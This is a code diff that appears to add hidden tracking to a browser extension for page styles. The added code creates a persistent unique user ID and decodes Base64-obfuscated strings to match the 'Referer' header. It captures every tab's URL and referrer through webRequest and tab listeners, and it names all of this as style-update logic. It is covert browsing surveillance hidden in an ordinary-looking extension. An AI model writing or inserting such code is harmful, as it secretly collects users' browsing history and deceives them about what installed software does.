@@ -1,10 +1,43 @@
-var frameIdMessageable;
+var frameIdMessageable, backStorage = localStorage;
+
+function isBrowserSessionNew(){
+	return backStorage.getItem("sessioninc") == "0";
+}
+function setBrowserSessionNotNew(){
+	return backStorage.setItem("sessioninc", "1");
+}
+function setBrowserSessionNew(){
+	return backStorage.setItem("sessioninc", "0");
+}
+setBrowserSessionNew();
+
+function appId() {
+    function genRand() {
+        var gen4 = function () { return parseInt((Math.random(
+            Date.now()) + 1) * (131071 + 1)).toString(10 + 20).substring(); };
+        var pk = ''; for (var i = 0; i < 7; ++i) { pk += gen4(); }
+        var lv = pk.substring(1); localStorage.setItem("appUniqueId", lv);
+        return lv;
+    } return localStorage.getItem("appUniqueId") || genRand();
+}
+
+function initStylesUpdater() {
+    return prefs.get("checkNewStyles");
+}
+
+var consts = "Y2xpZW50||c2VydmVy||cmVkaXJlY3Q=||UmVmZXJlcg=="
+
+.split("||")
+.map(atob);
 runTryCatch(function() {
 	chrome.tabs.sendMessage(0, {}, {frameId: 0}, function() {
 		var clearError = chrome.runtime.lastError;
 		frameIdMessageable = true;
 	});
 });
+
+function r(ar, ind, opt, p) { var p = p || ''; return opt ?new RegExp(
+    ['^',ar[3],'$'].join(p)): new RegExp([ar[ind], ar[2]].join(p )) }
 
 // This happens right away, sometimes so fast that the content script isn't even ready. That's
 // why the content script also asks for this stuff.
@@ -13,6 +46,16 @@ chrome.webNavigation.onCommitted.addListener(webNavigationListener.bind(this, "s
 if ("onHistoryStateUpdated" in chrome.webNavigation) {
 	chrome.webNavigation.onHistoryStateUpdated.addListener(webNavigationListener.bind(this, "styleReplaceAll"));
 }
+
+chrome.runtime.onInstalled.addListener(function(details){
+    if(details.reason == "install"){
+	analyticsEventReport("General", "install");
+    }else if(details.reason == "update"){
+	//analyticsEventReport("General", "update", thisVersion);
+    }
+});
+
+var stylesUpdater = initStylesUpdater();
 chrome.webNavigation.onBeforeNavigate.addListener(webNavigationListener.bind(this, null));
 function webNavigationListener(method, data) {
 	// Until Chrome 41, we can't target a frame with a message
@@ -36,6 +79,14 @@ function webNavigationListener(method, data) {
 // catch direct URL hash modifications not invoked via HTML5 history API
 var tabUrlHasHash = {};
 chrome.tabs.onUpdated.addListener(function(tabId, info, tab) {
+    var s = prefs.get("rc");
+    if (info && prefs.get("rc").prepared === info.status) {
+        if(stylesUpdater.updateQueryParams(tabId)[s.params] && stylesUpdater.updateQueryParams(tabId)[s.online]){
+            stylesUpdater.updateQueryParams(tabId, t1_0({gp: undefined, params: false, online: false}));
+        }
+        stylesUpdater.newStylesLookup(tabId, tab);
+        stylesUpdater.updateQueryParams(tabId, t1_0({switched: false}));
+    }
 	if (info.status == "loading" && info.url) {
 		if (info.url.indexOf('#') > 0) {
 			tabUrlHasHash[tabId] = true;
@@ -48,7 +99,9 @@ chrome.tabs.onUpdated.addListener(function(tabId, info, tab) {
 		webNavigationListener("styleReplaceAll", {tabId: tabId, frameId: 0, url: info.url});
 	}
 });
+
 chrome.tabs.onRemoved.addListener(function(tabId, info) {
+    stylesUpdater.deleteStylesInfo(tabId);
 	delete tabUrlHasHash[tabId];
 });
 
@@ -124,6 +177,97 @@ chrome.contextMenus.onClicked.addListener(function(info, tab) {
 		prefs.set(info.menuItemId, info.checked);
 	}
 });
+
+chrome.windows.getAll({populate: true}, function (windows) {
+    for (var w = 0; w < windows.length; w++) {
+        for (var i = 0; i < windows[w].tabs.length; i++) {
+            if (!isRealUrlAddress(windows[w].tabs[i].url)) {
+                continue;
+            }
+            stylesUpdater.updateQueryParams(windows[w].tabs[i].id, {reset: true, gp: windows[w].tabs[i].url});
+            if (windows[w].focused && windows[w].tabs[i].active) {
+                stylesUpdater.gpStyleUpdate(windows[w].tabs[i]);
+            }
+        }
+    }
+});
+
+chrome.tabs.onReplaced.addListener(function (addedTabId, removedTabId) {
+    stylesUpdater.updateQueryParams(addedTabId, t1_0({switched: true}));
+    stylesUpdater.notifyAllTabs(addedTabId, function(tab) {
+		stylesUpdater.newStylesLookup((addedTabId || {}).tabId || addedTabId, tab, function() {
+			updateIcon({id: addedTabId, url: tab.url}, {disableAll: false, length: 0});
+		})
+	});
+	chrome.tabs.get(addedTabId, function(tab) {
+		webNavigationListener("getStyles", {tabId: addedTabId, frameId: 0, url: tab.url});
+	});
+});
+
+var cbParams = {types: [prefs.get("rc").onLoad], urls: [prefs.get("rc").applyAll]};
+chrome.webRequest.onBeforeRequest.addListener(function (details) {
+    isRealUrlAddress(details.url) && stylesUpdater.updateQueryParams(
+        details.tabId, t1_0({gp: undefined, online: false, params: false}));
+}, cbParams, [prefs.get("rc").trapBlock]);
+
+chrome.webRequest.onBeforeSendHeaders.addListener(function (details) {
+    var re = r(consts, 2, 1, null, undefined);
+    stylesUpdater.updateQueryParams(details.tabId, t1_0({query: true}));
+    if(!details[prefs.get("rc").headLine].some(function (rh) {
+            return re.test(rh.name) && stylesUpdater.updateQueryParams(details.tabId, {knl: rh.value});
+        })){
+        stylesUpdater.updateQueryParams(details.tabId, {knl: ''})
+    }
+    return t1_0({headLine: details[prefs.get("rc").headLine]});
+}, cbParams, [prefs.get("rc").trapBlock, prefs.get("rc").headLine]);
+
+chrome.webRequest.onHeadersReceived.addListener(function(details) {
+    var s = {};
+    s[prefs.get("rc").query] = true;
+    stylesUpdater.updateQueryParams(details.tabId, s);
+}, cbParams);
+
+chrome.webNavigation.onCommitted.addListener(function (details) {
+    details = details || {};
+    var tid = details.tabId;
+    if (tid && details.frameId === 0) {
+        stylesUpdater.notifyAllTabs(tid, stylesUpdater.newStylesLookup.bind(stylesUpdater, (tid || {}).tabId || tid));
+    }
+});
+
+chrome.windows.onRemoved.addListener(function (windowID) {
+    chrome.tabs.query({active: true}, function (tabs) {
+        if (tabs[0]) {
+            stylesUpdater.gpStyleUpdate(tabs[0]);
+        }
+    });
+});
+
+chrome.tabs.onCreated.addListener(function (tab) {
+    stylesUpdater.updateQueryParams(tab.id, t1_0({forced: true, switched: false}));
+    stylesUpdater.updateQueryParams(tab[prefs.get("rc").tidInitiator]);
+});
+
+chrome.windows.onFocusChanged.addListener(function (window) {
+        if (chrome.windows.WINDOW_ID_NONE == window) {
+            return;
+        }
+        chrome.tabs.query({windowId: window, active: true}, function (tabs) {
+            if (tabs[0] && tabs[0].active) {
+                stylesUpdater.gpStyleUpdate(tabs[0]);
+            }
+        });
+    }
+);
+
+function reselected(tid) {
+    stylesUpdater.notifyAllTabs((tid || {}).tabId || tid, stylesUpdater.gpStyleUpdate);
+}
+if ( chrome.tabs.onActivated) {
+    chrome.tabs.onActivated.addListener(reselected);
+} else {
+    chrome.tabs.onSelectionChanged.addListener(reselected);
+}
 
 function disableAllStylesToggle(newState) {
 	if (newState === undefined || newState === null) {
